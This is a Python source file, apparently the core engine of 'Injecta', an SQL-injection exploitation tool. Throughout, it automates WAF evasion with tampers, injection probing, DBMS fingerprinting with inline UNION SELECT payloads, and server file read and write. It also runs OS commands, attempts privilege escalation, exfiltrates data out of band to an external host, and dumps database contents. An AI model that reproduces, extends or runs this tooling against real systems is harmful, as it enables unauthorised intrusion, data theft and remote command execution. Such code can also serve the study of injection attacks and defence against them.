"""
Injecta — Core scan orchestrator with multi-threading, WAF, file IO, NoSQL & GraphQL
"""
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple

from injecta.core.detector import Detector
from injecta.core.logger import VoidLogger
from injecta.core.requester import VoidRequester
from injecta.enum.dbms import DBMSEnumerator
from injecta.enum.tables import TableEnumerator
from injecta.enum.columns import ColumnEnumerator
from injecta.enum.data import DataDumper
from injecta.enum.fileio import FileIO
from injecta.payloads.mysql import MySQLPayloads
from injecta.payloads.postgresql import PostgreSQLPayloads
from injecta.payloads.mssql import MSSQLPayloads
from injecta.payloads.oracle import OraclePayloads
from injecta.payloads.sqlite import SQLitePayloads
from injecta.utils.helpers import extract_dbms_from_error
from injecta.utils.waf import WAFDetector
from injecta.utils.tamper import apply_tampers, build_chain, suggest_chains
from injecta.enum.extract import detect_column_count, detect_column_position
from injecta.techniques.nosql import NoSQLDetector
from injecta.techniques.graphql import GraphQLInjector
from injecta.enum.privesc import PrivilegeEscalation
from injecta.enum.oob import OOBExfiltrator
from injecta.enum.report import ReportGenerator
from injecta.enum.blind import BlindOptimizer
from injecta.enum.cms import CMSFingerprinter
from injecta.techniques.second_order import SecondOrderInjector
from injecta.techniques.websocket import WebSocketScanner
from injecta.plugins.loader import PluginLoader


PAYLOAD_REGISTRY = {
    "mysql": MySQLPayloads,
    "postgresql": PostgreSQLPayloads,
    "mssql": MSSQLPayloads,
    "oracle": OraclePayloads,
    "sqlite": SQLitePayloads,
}

TECHNIQUE_PRIORITY = {"E": "error", "B": "boolean", "U": "union", "T": "time", "S": "stacked"}


class ScanEngine:
    def __init__(self, config, logger: VoidLogger):
        self.config = config
        self.log = logger
        self.req = VoidRequester(config)
        self.detector = Detector(self.req, config, logger)
        self.waf = WAFDetector(self.req, config, logger)
        self.nosql = NoSQLDetector(self.req, config, logger)
        self.graphql = GraphQLInjector(self.req, config, logger)
        self.second_order = SecondOrderInjector(self.req, config, logger)
        self.ws_scanner = WebSocketScanner(self.req, config, logger)
        self.cms = CMSFingerprinter(self.req, config, logger)
        self.plugins = PluginLoader(config, logger)
        self.dbms = None
        self.payloads = None
        self.technique = None
        self.tamper_active = []
        self.vulnerable_params: List[Dict[str, Any]] = []
        self.injection_info: Optional[Dict[str, Any]] = None

    def run(self, url: str):
        self.log.banner()
        self.log.info(f"Starting Injecta scan on {url}")

        baseline_ok = self.detector.fetch_baseline(url)
        if not baseline_ok:
            self.log.error("Target unreachable. Aborting.")
            return

        self._run_plugins(url)

        waf_result = self.waf.scan(url)
        if waf_result["detected"]:
            self.tamper_active = waf_result.get("tamper", [])
            self.log.warn(f"WAF: {', '.join(waf_result['wafs'])} -- activating {len(self.tamper_active)} tamper(s)")
            if self.tamper_active:
                self.log.info(f"Tamper: {', '.join(self.tamper_active)}")
        else:
            self.log.ok("No WAF detected")
        self.detector.set_tamper(self.tamper_active)

        if self.config.nosql:
            self._run_nosql(url)

        if self.config.graphql:
            self._run_graphql(url)

        if self.config.cms or self.config.level >= 2:
            self._run_cms_fingerprint(url)

        if self.config.second_order:
            self._run_second_order(url)

        if self.config.ws:
            self._run_websec(url)

        params = self.detector.find_injection_points(url)
        self.log.info(f"Found {len(params)} injection parameter(s): {', '.join(params)}")

        self.log.info("Probing for SQL injection...")
        self._probe_parallel(url, params)

        if not self.vulnerable_params:
            self.log.warn("No injection point found with current techniques/levels.")
            return

        self.log.info("Fingerprinting database...")
        self.dbms = self._fingerprint_dbms(url)
        if not self.dbms:
            self.log.error("Could not identify database backend.")
            return

        self.log.ok(f"Identified DBMS: {self.dbms}")
        self.payloads = PAYLOAD_REGISTRY.get(self.dbms)
        if not self.payloads:
            self.log.error(f"No payload provider for {self.dbms}.")
            return

        self._ensure_column_count(url)
        self._handle_file_ops(url)

        if self.config.privesc or self.config.level >= 3:
            self._run_privesc(url)

        if self.config.oob_host:
            self._run_oob_exfil(url)

        self._execute_enumeration(url)

        self._generate_report(url)

    def _run_nosql(self, url: str):
        self.log.info("NoSQL mode enabled")
        result = self.nosql.scan(url)
        if result.get("detected"):
            self.log.info(f"NoSQL DB detected: {result.get('db_type')}")
            if result.get("vulnerable"):
                self.log.warn("NoSQL injection confirmed!")
            else:
                self.log.info("NoSQL endpoint found but injection not confirmed")
        else:
            self.log.info("No NoSQL endpoints detected")

    def _run_graphql(self, url: str):
        self.log.info("GraphQL mode enabled")
        result = self.graphql.discover(url)
        if result.get("found"):
            for ep in result.get("endpoints", []):
                inj = self.graphql.test_injection(ep)
                if inj.get("vulnerable"):
                    self.log.warn(f"GraphQL injection on {ep}")

    def _handle_file_ops(self, url: str):
        if not any([self.config.file_read, self.config.file_write, self.config.os_cmd]):
            return
        if not self.payloads:
            return

        param = self.injection_info.get("param", "") if self.injection_info else ""
        io = FileIO(self.req, self.config, self.log, self.payloads, self.injection_info or {})

        if self.config.file_read:
            results = io.read_file(url, param, self.config.file_read)
            if results:
                self.log.result(f"File content ({self.config.file_read}):")
                for line in results:
                    self.log.raw(f"  {line}")

        if self.config.file_write:
            content = self.config.file_write_content
            if not content and self.config.file_write_local:
                try:
                    with open(self.config.file_write_local, "r", encoding="utf-8") as fh:
                        content = fh.read()
                except Exception as e:
                    self.log.error(f"Could not read local file {self.config.file_write_local}: {e}")
                    content = self.config.file_write
            fpath = self.config.file_write
            if not content:
                content = fpath
            ok = io.write_file(url, param, fpath, content)
            if ok:
                self.log.result(f"File written to {fpath}")
            else:
                self.log.error(f"Failed to write {fpath}")

        if self.config.os_cmd:
            results = io.os_cmd(url, param, self.config.os_cmd)
            if results:
                self.log.result(f"Command output:")
                for line in results:
                    self.log.raw(f"  {line}")

    def _run_privesc(self, url: str):
        if not self.payloads or not self.injection_info:
            return
        param = self.injection_info.get("param", "")
        self.log.info("Running privilege escalation detection...")
        pe = PrivilegeEscalation(self.req, self.config, self.log, self.payloads, self.injection_info or {})
        result = pe.enumerate_privileges(url, param)
        if not result.get("is_admin"):
            escalation = pe.attempt_escalation(url, param)
            if escalation.get("success"):
                self.log.ok(f"Privilege escalated via {escalation['technique']}")
        self.privesc_result = result

    def _run_oob_exfil(self, url: str):
        if not self.payloads or not self.injection_info or not self.config.oob_host:
            return
        param = self.injection_info.get("param", "")
        self.log.info(f"OOB exfiltration to {self.config.oob_host}...")
        self.log.warn("OOB success requires external listener verification")
        oob = OOBExfiltrator(self.req, self.config, self.log, self.payloads, self.injection_info or {})
        for channel in ["dns", "http"]:
            r = oob.exfiltrate(url, param, "SELECT 1", self.config.oob_host, channel)
            if r.get("success"):
                self.log.info(f"OOB {channel.upper()} payload sent (verify on listener)")
                break

    def _generate_report(self, url: str):
        report = ReportGenerator(self.config, self.log)
        used_techs = list(set(v.get("technique", "?") for v in self.vulnerable_params)) if self.vulnerable_params else list(TECHNIQUE_PRIORITY.values())
        data = {
            "target": url,
            "dbms": self.dbms or "unknown",
            "waf": self.waf.detected_wafs if self.waf else [],
            "params": self.vulnerable_params,
            "privesc": getattr(self, "privesc_result", {}),
            "techniques": used_techs,
            "timestamp": __import__("time").strftime("%Y-%m-%d %H:%M:%S"),
            "tool": "Injecta Intelligence Platform",
            "team": "Kael / Krynn Team",
        }
        if self.config.output_dir or self.config.report:
            paths = report.generate_all(data)
            for fmt, p in paths.items():
                self.log.ok(f"Report ({fmt}): {p}")

    def _run_cms_fingerprint(self, url: str):
        if not self.config.cms and self.config.level < 2:
            return
        self.cms = CMSFingerprinter(self.req, self.config, self.log)
        result = self.cms.scan(url)
        self.cms_result = result

    def _run_second_order(self, url: str):
        self.log.info("Second-order injection module enabled")
        so = SecondOrderInjector(self.req, self.config, self.log)
        result = so.scan(url)
        self.second_order_result = result

    def _run_websec(self, url: str):
        self.log.info("WebSocket scanner enabled")
        result = self.ws_scanner.scan(url)
        self.ws_result = result

    def _run_plugins(self, url: str):
        if not self.config.plugins:
            return
        loaded = self.plugins.load_all()
        for p in loaded:
            p.initialize(self)
            p.on_scan_start(url)

    def _probe_parallel(self, url: str, params: List[str]):
        ordered_techs = self._resolve_techniques()
        max_workers = min(self.config.threads or 1, 8)

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = []
            for param in params:
                for tech in ordered_techs:
                    tid = id((param, tech))
                    futures.append(
                        pool.submit(self._probe_single, url, param, tech, tid)
                    )

            for future in as_completed(futures):
                result = future.result()
                if result:
                    result["url"] = url
                    self.vulnerable_params.append(result)
                    self.injection_info = result
                    self.log.ok(f"Parameter '{result['param']}' is vulnerable ({result['technique']})")
                    pool.shutdown(wait=False, cancel_futures=True)
                    return

    def _probe_single(self, url: str, param: str, tech_char: str, tid: int) -> Optional[Dict[str, Any]]:
        result = self.detector.test_parameter(url, param, tech_char)
        if result:
            result["tid"] = tid
        return result

    def _resolve_techniques(self) -> List[str]:
        given = self.config.technique.upper()
        ordered = []
        for c in "EBUTS":
            if c in given:
                ordered.append(c)
        return ordered if ordered else list("EBUTS")

    def _fingerprint_dbms(self, url: str) -> Optional[str]:
        if self.config.dbms and self.config.dbms != "auto":
            return self.config.dbms

        if self.injection_info and self.injection_info.get("dbms_hint"):
            return self.injection_info["dbms_hint"]

        param = self.injection_info.get("param", "") if self.injection_info else ""
        payload = self.injection_info.get("payload", "'") if self.injection_info else "'"

        _, resp_text, _ = self.req.test_raw(url, payload, param)
        if resp_text:
            dbms = extract_dbms_from_error(resp_text)
            if dbms:
                return dbms

        version_queries = {
            "mysql": ["SELECT @@version"],
            "postgresql": ["SELECT version()"],
            "mssql": ["SELECT @@version"],
            "oracle": ["SELECT banner FROM v$version WHERE ROWNUM=1"],
            "sqlite": ["SELECT sqlite_version()"],
        }

        for dbms_name, queries in version_queries.items():
            for q in queries:
                if self._test_for_dbms(url, q, dbms_name):
                    return dbms_name
        return None

    def _test_for_dbms(self, url: str, query: str, dbms_name: str) -> bool:
        test_payloads = [
            f"' UNION SELECT {query}-- -",
            f"1' UNION SELECT {query}-- -",
            f"' UNION SELECT {query}--",
            f"1 UNION SELECT {query}-- -",
        ]
        param = self.injection_info.get("param", "") if self.injection_info else ""

        for p in test_payloads:
            _, resp_text, _ = self.req.test_raw(url, p, param)
            if resp_text:
                if dbms_name == "mysql" and ("version" in resp_text or "5." in resp_text or "8." in resp_text):
                    return True
                if dbms_name == "postgresql" and ("PostgreSQL" in resp_text):
                    return True
                if dbms_name == "mssql" and ("Microsoft" in resp_text or "SQL Server" in resp_text):
                    return True
                if dbms_name == "oracle" and ("Oracle" in resp_text):
                    return True
                if dbms_name == "sqlite" and ("sqlite" in resp_text.lower()):
                    return True
        return False

    def _ensure_column_count(self, url: str):
        if not self.injection_info:
            return
        param = self.injection_info.get("param", "")
        if not param:
            return
        if not self.injection_info.get("column_count"):
            self.log.info("Detecting column count (ORDER BY)...")
            cols = detect_column_count(self.req, url, param)
            self.injection_info["column_count"] = cols
        cols = self.injection_info.get("column_count", 1)
        if not self.injection_info.get("data_pos"):
            self.log.info("Detecting data position...")
            pos = detect_column_position(self.req, url, param, cols)
            self.injection_info["data_pos"] = pos
        self.log.debug(f"Columns: {cols}, data position: {self.injection_info.get('data_pos', 1)}")

    def _execute_enumeration(self, url: str):
        param = self.injection_info.get("param", "") if self.injection_info else ""

        if self.config.dbs:
            self._enum_databases(url, param)
            return

        if self.config.db and self.config.tables:
            self._enum_tables(url, param, self.config.db)
            return

        if self.config.db and self.config.table and self.config.columns:
            self._enum_columns(url, param, self.config.db, self.config.table)
            return

        if self.config.db and self.config.table and self.config.column and self.config.dump:
            self._dump_data(url, param, self.config.db, self.config.table, self.config.column)
            return

        if not any([self.config.dbs, self.config.tables, self.config.columns, self.config.dump,
                     self.config.file_read, self.config.file_write, self.config.os_cmd]):
            self._default_enum(url, param)

    def _enum_databases(self, url: str, param: str):
        self.log.info("Enumerating databases...")
        info = self.injection_info or {}
        enumerator = DBMSEnumerator(self.req, self.config, self.log, self.payloads, info)
        databases = enumerator.enumerate(url, param)
        if databases:
            self.log.result(f"Found {len(databases)} database(s):")
            for db in databases:
                self.log.raw(f"  {db}")
        else:
            self.log.warn("No databases found.")

    def _enum_tables(self, url: str, param: str, db: str):
        self.log.info(f"Enumerating tables in '{db}'...")
        info = self.injection_info or {}
        enumerator = TableEnumerator(self.req, self.config, self.log, self.payloads, info)
        tables = enumerator.enumerate(url, param, db)
        if tables:
            self.log.result(f"Found {len(tables)} table(s) in '{db}':")
            for t in tables:
                self.log.raw(f"  {t}")
        else:
            self.log.warn(f"No tables found in '{db}'.")

    def _enum_columns(self, url: str, param: str, db: str, table: str):
        self.log.info(f"Enumerating columns in '{db}.{table}'...")
        info = self.injection_info or {}
        enumerator = ColumnEnumerator(self.req, self.config, self.log, self.payloads, info)
        cols = enumerator.enumerate(url, param, db, table)
        if cols:
            self.log.result(f"Found {len(cols)} column(s) in '{db}.{table}':")
            for c in cols:
                self.log.raw(f"  {c}")
        else:
            self.log.warn(f"No columns found in '{db}.{table}'.")

    def _dump_data(self, url: str, param: str, db: str, table: str, column: str):
        self.log.info(f"Dumping {column} from '{db}.{table}'...")
        info = self.injection_info or {}
        dumper = DataDumper(self.req, self.config, self.log, self.payloads, info)
        rows = dumper.dump(url, param, db, table, column)
        if rows:
            self.log.result(f"Dumped {len(rows)} row(s) from '{db}.{table}.{column}':")
            for row in rows:
                self.log.raw(f"  {row}")
        else:
            self.log.warn("No data returned.")

    def _default_enum(self, url: str, param: str):
        self.log.info("No enumeration flags set. Running default: database listing.")
        self._enum_databases(url, param)
